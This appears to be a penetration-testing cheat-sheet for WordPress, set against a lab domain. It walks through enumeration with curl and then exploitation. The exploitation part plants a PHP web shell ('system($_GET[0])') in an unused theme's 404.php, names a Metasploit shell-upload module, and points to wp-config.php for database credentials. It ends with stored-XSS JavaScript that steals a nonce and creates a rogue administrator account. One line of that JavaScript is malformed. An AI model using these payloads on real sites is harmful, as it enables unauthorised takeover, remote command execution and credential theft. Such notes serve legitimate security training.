WordPress is a free and open-source content management system (CMS) that lets anyone build and manage websites easily

    Manual enumeration

      In order to check if a website is a wordpress we could lookfor the robots.txt file which would look like this

      User-agent: *
Disallow: /wp-admin/
Allow: /wp-admin/admin-ajax.php
Disallow: /wp-content/uploads/wpforms/

      Another way to check it is by using curl

      curl -s http://blog.inlanefreight.local | grep WordPress

      Interesting endpoints

        http://domain.com/wp-admin   #Admin login 
http://domain.com/wp-content

http://domain.com/wp-content/themes  #Themes directory
http://domain.com/wp-content/uploads #Uploads directory

    Identifying vulnerabilities

      Themes

        An easy way of identifying vulnerabilties is through themes. Once we identifyied the theme name we could search for vulnerabilities related

        curl -s http://blog.inlanefreight.local/ | grep themes

      Plugins

        The same can be performed with plugins

        curl -s http://blog.inlanefreight.local/ | grep plugins

        http://blog.inlanefreight.local/wp-content/plugins/plugin-name/

Exploitation

    Command execution

      Once you have access to the administration panel of wordpress a good option to acquire command execution is to modify an existing theme and adding some fun stuff. Be intelligent and don't modify the current theme. Here are the steeps to perform it

      • Access the admin panel and then go to the appereance-> Theme Editor section
      • In the right side will appear all the themes select one of them which is not using currently (You can check which of them is selectec in the Appereance-> Themes section)
      • Select a simple page just like 404.php and add the following code
        • system($_GET[0]);
      • Then search for that page and pass the command as the first parameter
        • http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id

      You can automate this prcess by using the metasploit module

      exploit/unix/webapp/wp_admin_shell_upload

      Just in case you have a reverse shell, look for database credentials in the /var/www/html/wp-config.php

    Privilege escalation through XSS. Admin user creation

      All this process is based in the following post shift8

      In this section we will describe how to create an administrator user abusing an XSS vulnerability

      First identify a parameter in the request which could be affected by an XSS vulnerability. In this example there is installed a plugin called Visitors which stores some stats of the users which visit the wordpress website.

      In that case we identifyed that the user-agent parameter is stored in the plugin and that there is no sanitization which allow us to perform XSS attack

      To perform this attack we first need to find a way of dealing with nonce This nonce thing is basically a token that wordpress generates in every webrequest and which prevents from CSRF attacks.

      Since in our case the request will be performed from inside the wordpress (admin will look at the plugin from the admin panel and trigger the exploit) we don't have to worry about nonce.

      This function performs a new HTTP request towards the /wp-admin/user-new.php URL and saves the nonce value found in the HTTP response based on the regular expression.

      var ajaxRequest = new XMLHttpRequest();
var requestURL = "/wp-admin/user-new.php";
=var nonceRegex  /ser" value="([^"]*?)"/g;
ajaxRequest.open("GET", requestURL, false);
ajaxRequest.send();
var nonceMatch = nonceRegex.exec(ajaxRequest.responseText);
var nonce = nonceMatch[1];

      Now that we've dynamically retrieved the nonce, we can craft the main function responsible for creating the new admin user.

      var params = "action=createuser&_wpnonce_create-user="+nonce+"&user_login=attacker&email=attacker@offsec.com&pass1=attackerpass&pass2=attackerpass&role=administrator";
ajaxRequest = new XMLHttpRequest();
ajaxRequest.open("POST", requestURL, true);
ajaxRequest.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
ajaxRequest.send(params);
